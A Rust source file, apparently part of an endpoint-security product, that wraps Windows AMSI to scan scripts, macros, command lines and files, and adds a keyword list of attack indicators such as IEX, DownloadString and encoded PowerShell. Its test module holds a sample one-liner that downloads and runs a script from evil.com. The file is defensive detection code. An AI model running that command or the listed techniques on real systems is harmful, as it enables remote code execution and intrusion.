//! Antimalware Scan Interface (AMSI) Integration
//!
//! Integrates with Windows AMSI to scan:
//! - PowerShell scripts before execution
//! - VBScript/JScript code
//! - Office macros
//! - Downloaded files
//! - Arbitrary buffers
//!
//! AMSI allows EDR to inspect content BEFORE execution, enabling
//! true prevention (not just detection)
//!
//! Author: TamsilCMS Security Team
//! Date: 2026-02-10

use std::ptr;
use serde::{Deserialize, Serialize};
use windows::core::{HRESULT, PCWSTR};

/// AMSI Scan Result
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[repr(u32)]
pub enum AMSIResult {
    Clean = 0,
    NotDetected = 1,
    Detected = 32768,
}

impl From<u32> for AMSIResult {
    fn from(value: u32) -> Self {
        match value {
            0 => AMSIResult::Clean,
            1 => AMSIResult::NotDetected,
            32768..=u32::MAX => AMSIResult::Detected,
            _ => AMSIResult::NotDetected,
        }
    }
}

impl AMSIResult {
    pub fn is_malicious(&self) -> bool {
        matches!(self, AMSIResult::Detected)
    }

    pub fn is_clean(&self) -> bool {
        matches!(self, AMSIResult::Clean | AMSIResult::NotDetected)
    }
}

/// AMSI Scan results with metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AMSIScanResult {
    pub result: AMSIResult,
    pub content_name: String,
    pub content_size: usize,
    pub app_name: String,
    pub detection_signature: Option<String>,
}

/// AMSI Session context
pub struct AMSISession {
    context: HAMSICONTEXT,
    session: HAMSISESSION,
    app_name: String,
}

// External AMSI API declarations
#[link(name = "amsi")]
extern "system" {
    fn AmsiInitialize(
        appName: PCWSTR,
        amsiContext: *mut HAMSICONTEXT,
    ) -> HRESULT;

    fn AmsiUninitialize(amsiContext: HAMSICONTEXT);

    fn AmsiOpenSession(
        amsiContext: HAMSICONTEXT,
        amsiSession: *mut HAMSISESSION,
    ) -> HRESULT;

    fn AmsiCloseSession(
        amsiContext: HAMSICONTEXT,
        amsiSession: HAMSISESSION,
    );

    fn AmsiScanBuffer(
        amsiContext: HAMSICONTEXT,
        buffer: *const u8,
        length: u32,
        contentName: PCWSTR,
        amsiSession: HAMSISESSION,
        result: *mut u32,
    ) -> HRESULT;

    fn AmsiScanString(
        amsiContext: HAMSICONTEXT,
        string: PCWSTR,
        contentName: PCWSTR,
        amsiSession: HAMSISESSION,
        result: *mut u32,
    ) -> HRESULT;
}

// Opaque handles
#[repr(C)]
pub struct HAMSICONTEXT__ {
    unused: i32,
}
pub type HAMSICONTEXT = *mut HAMSICONTEXT__;

#[repr(C)]
pub struct HAMSISESSION__ {
    unused: i32,
}
pub type HAMSISESSION = *mut HAMSISESSION__;

impl AMSISession {
    /// Initialize AMSI session
    pub fn new(app_name: &str) -> Result<Self, Box<dyn std::error::Error>> {
        unsafe {
            let wide_name: Vec<u16> = app_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let mut context: HAMSICONTEXT = ptr::null_mut();
            let hr = AmsiInitialize(PCWSTR(wide_name.as_ptr()), &mut context);

            if hr.is_err() {
                return Err(format!("AmsiInitialize failed: 0x{:X}", hr.0).into());
            }

            let mut session: HAMSISESSION = ptr::null_mut();
            let hr = AmsiOpenSession(context, &mut session);

            if hr.is_err() {
                AmsiUninitialize(context);
                return Err(format!("AmsiOpenSession failed: 0x{:X}", hr.0).into());
            }

            tracing::info!("AMSI session initialized: {}", app_name);

            Ok(Self {
                context,
                session,
                app_name: app_name.to_string(),
            })
        }
    }

    /// Scan buffer for malicious content
    pub fn scan_buffer(
        &self,
        buffer: &[u8],
        content_name: &str,
    ) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        unsafe {
            let wide_name: Vec<u16> = content_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let mut result: u32 = 0;
            let hr = AmsiScanBuffer(
                self.context,
                buffer.as_ptr(),
                buffer.len() as u32,
                PCWSTR(wide_name.as_ptr()),
                self.session,
                &mut result,
            );

            if hr.is_err() {
                return Err(format!("AmsiScanBuffer failed: 0x{:X}", hr.0).into());
            }

            let amsi_result = AMSIResult::from(result);

            if amsi_result.is_malicious() {
                tracing::warn!(
                    "AMSI detected malicious content: {} (size: {})",
                    content_name,
                    buffer.len()
                );
            }

            Ok(AMSIScanResult {
                result: amsi_result,
                content_name: content_name.to_string(),
                content_size: buffer.len(),
                app_name: self.app_name.clone(),
                detection_signature: if amsi_result.is_malicious() {
                    Some(format!("AMSI_DETECTED_{:X}", result))
                } else {
                    None
                },
            })
        }
    }

    /// Scan string content (PowerShell, VBScript, etc.)
    pub fn scan_string(
        &self,
        content: &str,
        content_name: &str,
    ) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        unsafe {
            let wide_content: Vec<u16> = content
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let wide_name: Vec<u16> = content_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let mut result: u32 = 0;
            let hr = AmsiScanString(
                self.context,
                PCWSTR(wide_content.as_ptr()),
                PCWSTR(wide_name.as_ptr()),
                self.session,
                &mut result,
            );

            if hr.is_err() {
                return Err(format!("AmsiScanString failed: 0x{:X}", hr.0).into());
            }

            let amsi_result = AMSIResult::from(result);

            if amsi_result.is_malicious() {
                tracing::warn!(
                    "AMSI detected malicious script: {} (length: {})",
                    content_name,
                    content.len()
                );
            }

            Ok(AMSIScanResult {
                result: amsi_result,
                content_name: content_name.to_string(),
                content_size: content.len(),
                app_name: self.app_name.clone(),
                detection_signature: if amsi_result.is_malicious() {
                    Some(format!("AMSI_DETECTED_{:X}", result))
                } else {
                    None
                },
            })
        }
    }
}

impl Drop for AMSISession {
    fn drop(&mut self) {
        unsafe {
            if !self.session.is_null() {
                AmsiCloseSession(self.context, self.session);
            }
            if !self.context.is_null() {
                AmsiUninitialize(self.context);
            }
        }
        tracing::info!("AMSI session closed: {}", self.app_name);
    }
}

/// High-level AMSI Scanner
pub struct AMSIScanner {
    session: AMSISession,
}

impl AMSIScanner {
    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let session = AMSISession::new("TamsilCMS-Sentinel")?;
        Ok(Self { session })
    }

    /// Scan PowerShell script
    pub fn scan_powershell(&self, script: &str) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        self.session.scan_string(script, "PowerShell Script")
    }

    /// Scan VBScript
    pub fn scan_vbscript(&self, script: &str) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        self.session.scan_string(script, "VBScript")
    }

    /// Scan JavaScript
    pub fn scan_javascript(&self, script: &str) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        self.session.scan_string(script, "JavaScript")
    }

    /// Scan Office macro
    pub fn scan_macro(&self, macro_code: &str) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        self.session.scan_string(macro_code, "Office Macro")
    }

    /// Scan arbitrary file content
    pub fn scan_file(&self, content: &[u8], filename: &str) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        self.session.scan_buffer(content, filename)
    }

    /// Scan command line
    pub fn scan_command_line(&self, cmdline: &str) -> Result<AMSIScanResult, Box<dyn std::error::Error>> {
        self.session.scan_string(cmdline, "Command Line")
    }
}

/// AMSI-based threat detection patterns
pub struct AMSIThreatDetector {
    scanner: AMSIScanner,
}

impl AMSIThreatDetector {
    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
        Ok(Self {
            scanner: AMSIScanner::new()?,
        })
    }

    /// Check if PowerShell command is malicious
    pub fn is_powershell_malicious(&self, script: &str) -> bool {
        match self.scanner.scan_powershell(script) {
            Ok(result) => result.result.is_malicious(),
            Err(e) => {
                tracing::error!("AMSI PowerShell scan failed: {}", e);
                false
            }
        }
    }

    /// Check common attack indicators
    pub fn detect_attack_patterns(&self, content: &str) -> Vec<String> {
        let mut detections = Vec::new();

        // Scan with AMSI first
        if let Ok(result) = self.scanner.scan_powershell(content) {
            if result.result.is_malicious() {
                if let Some(sig) = result.detection_signature {
                    detections.push(sig);
                }
            }
        }

        // Additional pattern checks
        let patterns = [
            ("IEX", "Invoke-Expression (fileless execution)"),
            ("DownloadString", "Web download in memory"),
            ("FromBase64String", "Base64 encoded payload"),
            ("Reflection.Assembly", ".NET assembly injection"),
            ("VirtualAlloc", "Memory allocation (shellcode)"),
            ("CreateThread", "Thread creation (injection)"),
            ("WScript.Shell", "Script execution"),
            ("powershell -enc", "Encoded PowerShell"),
            ("bypass", "Execution policy bypass"),
            ("hidden", "Hidden window execution"),
        ];

        for (pattern, description) in &patterns {
            if content.to_lowercase().contains(&pattern.to_lowercase()) {
                detections.push(format!("{}: {}", pattern, description));
            }
        }

        detections
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_amsi_session_creation() {
        // AMSI requires Windows 10+
        if let Ok(scanner) = AMSIScanner::new() {
            assert!(true);
        }
    }

    #[test]
    fn test_malicious_powershell_detection() {
        if let Ok(scanner) = AMSIScanner::new() {
            let malicious_script = r#"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"#;
            let result = scanner.scan_powershell(malicious_script);
            // Should detect or at least not crash
            assert!(result.is_ok());
        }
    }
}
